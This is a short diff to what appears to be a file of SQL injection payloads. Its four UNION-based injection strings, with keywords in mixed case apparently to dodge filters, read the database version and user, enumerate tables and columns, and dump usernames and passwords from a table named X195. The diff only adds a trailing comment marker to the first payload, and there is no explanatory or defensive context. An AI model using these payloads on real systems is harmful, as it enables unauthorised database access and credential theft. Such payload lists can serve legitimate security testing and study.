@@ -1,4 +1,4 @@
-d'unioN sElect version(),user() FROM information_schema.tables
+d'unioN sElect version(),user() FROM information_schema.tables#
 d'unioN SELeCT database(),table_name FROM information_schema.tables where table_schema=database()#
 d'unioN seleCt column_name,database() from information_schema.columns where table_name="X195"#
 d'Union Select user,pass from X195#
